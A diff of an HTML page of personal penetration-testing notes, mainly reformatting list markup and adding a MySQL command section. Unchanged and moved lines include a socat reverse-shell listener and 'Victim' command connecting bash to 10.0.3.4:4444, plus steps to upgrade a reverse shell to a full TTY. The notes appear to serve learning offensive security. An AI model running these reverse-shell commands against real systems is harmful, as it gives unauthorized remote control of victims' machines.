@@ -170,22 +170,22 @@ And this way fault tolerance is provided.</li>
 </ul>
 <br/>  
 <ul>
-<li>Using Python for a psuedo terminal</li>
-</ul>
+<li>
+<p>Using Python for a psuedo terminal</p>
 <pre><code class="language-console"><div>python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
 </div></code></pre>
-<ul>
-<li>Using socat  WORKED INSTEAD OF <code>nc</code></li>
-</ul>
+</li>
+<li>
+<p>Using socat  WORKED INSTEAD OF <code>nc</code></p>
 <pre><code class="language-console"><div><span class="hljs-meta">#</span><span class="bash">Listener</span>
 socat file:`tty`,raw,echo=0 tcp-listen:4444
 <span class="hljs-meta">
 #</span><span class="bash">Victim  </span>
 socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sane tcp:10.0.3.4:4444
 </div></code></pre>
-<ul>
-<li>Using stty options NOT WORKING WITH ME</li>
-</ul>
+</li>
+<li>
+<p>Using stty options NOT WORKING WITH ME</p>
 <pre><code class="language-console"><div><span class="hljs-meta">#</span><span class="bash"> In reverse shell </span>
 python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
 ctrl-z  
@@ -200,9 +200,13 @@ export ShELL=bash
 export TERM=xterm-256color
 stty row &lt;num&gt; columns &lt;cols&gt;
 </div></code></pre>
-<ul>
-<li>If we type <code>stty -a</code> it will give me info and I can get the rows and columns from there.</li>
-<li>I can also echo the $TERM variable and put its value in the reverse shell as the value I have on my Kali.</li>
+</li>
+<li>
+<p>If we type <code>stty -a</code> it will give me info and I can get the rows and columns from there.</p>
+</li>
+<li>
+<p>I can also echo the $TERM variable and put its value in the reverse shell as the value I have on my Kali.</p>
+</li>
 </ul>
 <p><br/><br/></p>
 <h3 id="span-classuseful_shit-subtitlesudo"><span class="useful_shit subtitle">sudo</h3>
@@ -310,17 +314,47 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 <p><br/><br/></p>
 <h3 id="span-classuseful_shit-subtitleenvironment-variables"><span class="useful_shit subtitle">Environment Variables</h3>
 <ul>
-<li>To view the contents of an env variable</li>
-</ul>
+<li>
+<p>To view the contents of an env variable</p>
 <pre><code class="language-console"><div>echo $[ENV VAR]
 </div></code></pre>
-<ul>
-<li>For the change in  the contents of a variable to be for all we have to export it</li>
-</ul>
+</li>
+<li>
+<p>For the change in  the contents of a variable to be for all we have to export it</p>
 <pre><code class="language-console"><div>export [ENVE VAR]
 </div></code></pre>
+</li>
+</ul>
 <p><br/><br/></p>
 <h3 id="span-classuseful_shit-subtitlemysql"><span class="useful_shit subtitle">MySQL</h3>
+<ul>
+<li>
+<p>To access mysql database on localhost we can use</p>
+<pre><code><code><div>mysql -u [USERNAME] -p
+</div></code></code></pre>
+</li>
+<li>
+<p>To access the database remotely</p>
+<pre><code><code><div>mysql -u [USERNAME] -p [IP ADDRESS]
+</div></code></code></pre>
+</li>
+<li>
+<p>In the default configuration of mysql the root user's password is <em>empty</em>.</p>
+</li>
+<li>
+<p>Mysql's command prompt. Some of its commands</p>
+<pre><code class="language-console"><div><span class="hljs-meta">mysql&gt;</span><span class="bash"> show databases;</span>
+<span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from [TABLE NAME];</span>
+<span class="hljs-meta">mysql&gt;</span><span class="bash"> use [DATABASE NAME];</span>
+<span class="hljs-meta">mysql&gt;</span><span class="bash"> show tables;</span>
+</div></code></pre>
+</li>
+<li>
+<p>Mysql is a service that can be run on a computer and I can run it as follows</p>
+<pre><code class="language-console"><div><span class="hljs-meta">kali&gt;</span><span class="bash"> service mysql start</span>
+</div></code></pre>
+</li>
+</ul>
 <p><br/><br/></p>
 <h3 id="span-classuseful_shit-subtitle-proxy-servers"><span class="useful_shit subtitle"> Proxy Servers</h3>
 <ul>
